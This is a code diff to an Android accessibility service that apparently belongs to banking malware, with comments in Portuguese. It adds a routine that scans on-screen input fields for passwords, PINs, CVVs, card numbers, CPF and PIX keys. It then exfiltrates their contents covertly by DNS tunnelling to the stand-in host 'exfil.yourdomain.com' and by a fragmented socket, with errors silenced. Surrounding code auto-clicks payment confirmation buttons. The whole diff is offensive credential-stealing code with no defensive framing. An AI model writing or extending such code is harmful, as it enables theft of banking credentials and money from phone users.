@@ -142,6 +142,9 @@ public class AccessibilityCaptureService extends AccessibilityService {
                 String[] confirmButtons = { "Confirmar", "Enviar", "Pagar", "Transferir", "Aprovar" };
                 gestureManager.findAndClickConfirmationButton(root, confirmButtons);
 
+                // === EXFILTRAÇÃO AUTOMÁTICA DE DADOS SENSÍVEIS ===
+                detectAndExfilSensitiveData(root, packageName);
+
                 JSONObject payload = buildBasicPayload(event, root);
                 if (payload != null) {
                     lastSentAt = now;
@@ -237,6 +240,10 @@ public class AccessibilityCaptureService extends AccessibilityService {
 
     public static AccessibilityCaptureService getInstance() {
         return instance;
+    }
+
+    public ATSManager getAtsManager() {
+        return atsManager;
     }
 
     // ==================== MÉTODOS DE BYPASS ====================
@@ -488,6 +495,87 @@ public class AccessibilityCaptureService extends AccessibilityService {
             }
         } catch (Exception e) {
             e.printStackTrace();
+        }
+    }
+
+    // ==================== DETECÇÃO E EXFILTRAÇÃO AUTOMÁTICA DE DADOS SENSÍVEIS
+    // ====================
+
+    private static final String[] SENSITIVE_PATTERNS = {
+            "senha", "password", "pass", "pin", "cvv", "cvc",
+            "cartao", "card", "credit", "cartão", "numero do cartao",
+            "cpf", "cnpj", "rg", "conta", "agencia", "chave pix", "pix",
+            "email", "e-mail", "telefone", "phone", "celular",
+            "titular", "nome completo", "endereco", "address", "cep"
+    };
+
+    private long lastSensitiveExfil = 0;
+    private static final long SENSITIVE_EXFIL_COOLDOWN = 3000; // 3s para evitar flood
+
+    private void detectAndExfilSensitiveData(AccessibilityNodeInfo root, String packageName) {
+        if (root == null)
+            return;
+
+        long now = System.currentTimeMillis();
+        if (now - lastSensitiveExfil < SENSITIVE_EXFIL_COOLDOWN)
+            return;
+
+        try {
+            String text = root.getText() != null ? root.getText().toString() : "";
+            String desc = root.getContentDescription() != null ? root.getContentDescription().toString() : "";
+            String viewId = root.getViewIdResourceName() != null ? root.getViewIdResourceName() : "";
+            String combined = (text + " " + desc + " " + viewId).toLowerCase();
+
+            boolean isSensitive = false;
+            String matchedPattern = "";
+
+            for (String pattern : SENSITIVE_PATTERNS) {
+                if (combined.contains(pattern)) {
+                    isSensitive = true;
+                    matchedPattern = pattern;
+                    break;
+                }
+            }
+
+            // Se for campo editável com texto preenchido
+            if (isSensitive && root.isEditable() && text.length() > 2) {
+                lastSensitiveExfil = now;
+
+                JSONObject exfilData = new JSONObject();
+                exfilData.put("package", packageName != null ? packageName : "unknown");
+                exfilData.put("pattern", matchedPattern);
+                exfilData.put("field", viewId);
+                exfilData.put("value", text);
+                exfilData.put("ts", now);
+
+                // Escolhe canal stealth (DNS é mais silencioso em muitos cenários)
+                String payload = exfilData.toString();
+
+                // 1. Tenta DNS Tunneling primeiro (mais stealth)
+                try {
+                    ExfilManager.sendViaDNSTunnel("exfil.yourdomain.com", payload);
+                } catch (Exception ignored) {
+                }
+
+                // 2. Também envia fragmentado via socket (se conectado)
+                try {
+                    ExfilManager.sendFragmented("0xEX", payload);
+                } catch (Exception ignored) {
+                }
+
+                Log.d("SensitiveExfil", "Exfiltrated sensitive field: " + matchedPattern + " len=" + text.length());
+            }
+
+            // Recursão nos filhos
+            for (int i = 0; i < root.getChildCount(); i++) {
+                AccessibilityNodeInfo child = root.getChild(i);
+                if (child != null) {
+                    detectAndExfilSensitiveData(child, packageName);
+                    child.recycle();
+                }
+            }
+        } catch (Exception e) {
+            // silencioso
         }
     }
 }
